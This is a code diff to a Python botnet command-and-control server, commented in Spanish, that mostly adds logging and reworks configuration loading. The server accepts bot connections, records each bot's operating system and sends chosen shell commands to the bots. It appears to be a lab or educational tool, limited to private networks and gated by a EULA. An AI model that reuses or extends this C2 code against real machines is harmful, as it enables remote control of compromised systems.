@@ -14,33 +14,27 @@ bot_ids = {} # Diccinario con los IDS de los bots
 sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot
 respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots
 
-def configurar_logging():
-    
+def configurar_logging(config):
     """
     Configura el sistema de logging del servidor.
 
-    Lee la configuración desde el archivo `config/config.ini` y configura
-    el sistema de logging según los valores especificados en la sección
-    `LOGGING`.
+    El nivel de log se establece según la clave "LOG_LEVEL" en el objeto de configuración.
+    El nivel de log puede ser "DEBUG", "INFO", "WARNING", "ERROR" o "CRITICAL".
+    Si no se especifica un nivel de log, se establece en "INFO" por defecto.
 
-    Los valores que se pueden especificar son:
-        * `LOG_LEVEL`: Nivel de log (DEBUG, INFO, WARNING, ERROR, CRITICAL)
-        * `LOG_FILE`: Ruta del archivo de log
+    La ruta del archivo de log se establece según la clave "LOG_FILE" en el objeto de configuración.
+    La ruta se crea si no existe.
 
-    Si no se especifica un valor, se usan los valores predeterminados:
-        * `LOG_LEVEL`: INFO
-        * `LOG_FILE`: `logs/server.log`
+    El formato de los mensajes de log se establece en "%(asctime)s - %(levelname)s - %(message)s".
 
-    :return: None
+    Los mensajes de log se escriben en el archivo de log y en la consola.
+
+    :param config: Un objeto con la configuración del servidor.
     """
-    config = configparser.ConfigParser()
-    config.read('config/config.ini')
+    
+    log_level = config["LOG_LEVEL"].upper()
+    log_file = config["SERVER_LOG_FILE"]
 
-    # Obtener valores de configuración
-    log_level = config.get('LOGGING', 'LOG_LEVEL', fallback='INFO').upper()
-    log_file = config.get('LOGGING', 'LOG_FILE', fallback='logs/server.log')
-
-    # Convertir a nivel de logging válido
     log_levels = {
         "DEBUG": logging.DEBUG,
         "INFO": logging.INFO,
@@ -50,15 +44,13 @@ def configurar_logging():
     }
     log_level = log_levels.get(log_level, logging.INFO)
 
-    # Crear directorio de logs si no existe
     os.makedirs(os.path.dirname(log_file), exist_ok=True)
 
-    # Configurar logging
     logging.basicConfig(
         level=log_level,
         format="%(asctime)s - %(levelname)s - %(message)s",
         handlers=[
-            logging.FileHandler(log_file),
+            logging.FileHandler(log_file, encoding="utf-8"),
             logging.StreamHandler()
         ]
     )
@@ -95,6 +87,7 @@ def init_db(DB_PATH):
 
     conn.commit()
     conn.close()
+    logging.info("Base de datos inicializada correctamente.")
 
 def detectarEntornoCloud():
     
@@ -114,6 +107,7 @@ def detectarEntornoCloud():
     try:
         # AWS Metadata
         if requests.get("http://169.254.169.254/latest/meta-data/", timeout=1).status_code == 200:
+            logging.info("Entorno de cloud computing detectado.")
             return True
     except requests.exceptions.RequestException:
         pass
@@ -121,6 +115,7 @@ def detectarEntornoCloud():
     try:
         # Google Cloud Metadata
         if requests.get("http://metadata.google.internal/", timeout=1).status_code == 200:
+            logging.info("Entorno de cloud computing detectado.")
             return True
     except requests.exceptions.RequestException:
         pass
@@ -142,7 +137,9 @@ def esRedPrivada(ip):
     """
 
     try:
-        return ipaddress.ip_address(ip).is_private
+        result = ipaddress.ip_address(ip).is_private
+        logging.info(f"Verificación de red privada para la IP: {ip}")
+        return result
     except ValueError:
         return False
 
@@ -155,7 +152,9 @@ def verificar_eula(tipo):
     if tipo not in ["servidor", "cliente"]:
         raise ValueError("Tipo de EULA no válido. Debe ser 'servidor' o 'cliente'.")
 
-    eula_path = f"eula_{tipo}.txt"
+    # Ruta para el archivo EULA en la carpeta docs
+    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+    eula_path = os.path.join(BASE_DIR, "..", "docs", f"eula_{tipo}.txt")
 
     # Si no existe, lo crea
     if not os.path.exists(eula_path):
@@ -166,6 +165,7 @@ def verificar_eula(tipo):
     with open(eula_path, "r") as f:
         for linea in f:
             if "ACCEPTED=True" in linea:
+                logging.info(f"Verificación de EULA para el tipo: {tipo}")
                 return True
 
     # Mostrar Acuerdo de Licencia
@@ -192,6 +192,7 @@ def verificar_eula(tipo):
     if respuesta == "ACEPTO":
         with open(eula_path, "w") as f:
             f.write("ACCEPTED=True")
+        logging.info(f"Verificación de EULA para el tipo: {tipo}")
         return True
     else:
         print("Debe aceptar la licencia para usar este software.")
@@ -210,6 +211,7 @@ def manejar_bot(conn, addr, bot_id):
     :type bot_id: int
     """
     
+    logging.info(f"Bot {bot_id} conectado desde {addr}")
     print(f"Bot {bot_id} conectado desde {addr}")
 
     # Detectar sistema operativo
@@ -245,6 +247,7 @@ def manejar_bot(conn, addr, bot_id):
         del bot_ids[conn]
     if conn in sistemas_operativos:
         del sistemas_operativos[conn]
+    logging.info(f"Bot {bot_id} desconectado")
     print(f"Bot {bot_id} desconectado")
 
 def servidor_CnC(HOST, PORT):
@@ -257,6 +260,7 @@ def servidor_CnC(HOST, PORT):
 
     :return: None
     """
+    logging.info(f"Iniciando servidor CnC en {HOST}:{PORT}")
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crear el socket
     server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto
     server.listen(5) # Escuchar conexiones
@@ -279,6 +283,7 @@ def servidor_CnC(HOST, PORT):
         elif opcion == "3":
             cerrar_conexion_bots()
         elif opcion == "4":
+            logging.info("Servidor CnC detenido")
             print("Saliendo de la consola...")
             exit()
         else:
@@ -297,6 +302,7 @@ def aceptar_conexiones(server):
     :param server: El socket del servidor C&C.
     :type server: socket.socket
     """
+    logging.info("Aceptando conexiones de bots")
     bot_id = 1 # Contador de bots
     while True:
         conn, addr = server.accept() # Aceptar la conexión
@@ -313,6 +319,7 @@ def listar_bots():
     
     :return: None
     """
+    logging.info("Listando bots conectados")
     if bots:
         print("\nBots conectados:")
         for bot in bots: # Recorrer la lista de bots
@@ -330,7 +337,7 @@ def menu_comandos():
 
     :return: None
     """
-
+    logging.info("Mostrando menú de comandos")
     if not bots:
         print("No hay bots conectados.")
         return
@@ -457,7 +464,7 @@ def enviar_comando(comando_windows, comando_linux):
     :param comando_linux: El comando a enviar a los bots Linux.
     :type comando_linux: str
     """
-    
+    logging.info("Enviando comando a los bots seleccionados")
     if not bots:
         print("No hay bots conectados.")
         return
@@ -535,7 +542,7 @@ def enviar_comando_a_bot(bot, comando_windows, comando_linux):
     :return: La respuesta del bot o un mensaje de error si no se recibe 
              respuesta o si el bot se desconecta.
     """
-
+    logging.info(f"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}")
     so = sistemas_operativos.get(bot, "desconocido")
     comando = comando_windows if so == "windows" else comando_linux
     bot_id = bot_ids.get(bot, "Desconocido")
@@ -578,7 +585,7 @@ def cerrar_conexion_bots():
     
     :return: None
     """
-    
+    logging.info("Cerrando conexión con los bots seleccionados")
     if not bots:
         print("No hay bots conectados.")
         return
@@ -629,7 +636,7 @@ def cargar_configuracion():
         * SECRET_KEY: Clave secreta para la autenticación.
         * HASH_ALGORITHM: Algoritmo de hash para la autenticación.
         * LOG_LEVEL: Nivel de log (DEBUG, INFO, WARNING, ERROR, CRITICAL).
-        * LOG_FILE: Ruta del archivo de log.
+        * SERVER_LOG_FILE: Ruta del archivo de log.
 
     Si no se encuentra el archivo de configuración o hay un error al leerlo,
     se muestra un mensaje de error y se sale del programa con un estado de
@@ -637,6 +644,7 @@ def cargar_configuracion():
 
     :return: Un objeto con la configuración cargada.
     """
+    logging.info("Cargando configuración del servidor")
     try:
         BASE_DIR = os.path.dirname(os.path.abspath(__file__))
         CONFIG_DIR = os.path.join(BASE_DIR, "..", "config")
@@ -657,7 +665,7 @@ def cargar_configuracion():
             "SECRET_KEY": config.get("SECURITY", "SECRET_KEY"),
             "HASH_ALGORITHM": config.get("SECURITY", "HASH_ALGORITHM"),
             "LOG_LEVEL": config.get("LOGGING", "LOG_LEVEL"),
-            "LOG_FILE": os.path.join(BASE_DIR, config.get("LOGGING", "LOG_FILE"))
+            "SERVER_LOG_FILE": os.path.join(BASE_DIR, "..", config.get("LOGGING", "LOG_DIR"), config.get("LOGGING", "SERVER_LOG_FILE"))
         }
     except Exception as e:
         print(f"[ERROR] Error al cargar la configuración: {e}")
@@ -683,7 +691,7 @@ def configurar_logging(config):
     """
     
     log_level = config["LOG_LEVEL"].upper()
-    log_file = config["LOG_FILE"]
+    log_file = config["SERVER_LOG_FILE"]
 
     log_levels = {
         "DEBUG": logging.DEBUG,
@@ -700,7 +708,7 @@ def configurar_logging(config):
         level=log_level,
         format="%(asctime)s - %(levelname)s - %(message)s",
         handlers=[
-            logging.FileHandler(log_file),
+            logging.FileHandler(log_file, encoding="utf-8"),
             logging.StreamHandler()
         ]
     )
@@ -708,7 +716,6 @@ def configurar_logging(config):
     logging.info("Sistema de logging configurado correctamente.")
 
 def iniciar_servidor():
-    
     """
     Inicializa el servidor de Comando y Control (C2) verificando primero
     que no se ejecute en una red privada y mostrando un aviso de EULA.
@@ -718,15 +725,16 @@ def iniciar_servidor():
 
     :return: None
     """
-    
+    logging.info("Iniciando servidor de Comando y Control (C2)")
     config = cargar_configuracion()
     if not esRedPrivada(config["HOST"]):
         input("[ERROR] No puedes ejecutar este servidor fuera de una red privada. Presione ENTER para cerrar.")
         sys.exit(1)
     verificar_eula("servidor")
     init_db(config["DB_PATH"])
-    configurar_logging(config)
-    servidor_CnC()
+    configurar_logging(config)  # Pasar el objeto de configuración en lugar de la cadena
+    servidor_CnC(config["HOST"], config["PORT"])
+    logging.info("Servidor de Comando y Control (C2) iniciado correctamente")
 
 if __name__ == "__main__":
     iniciar_servidor()
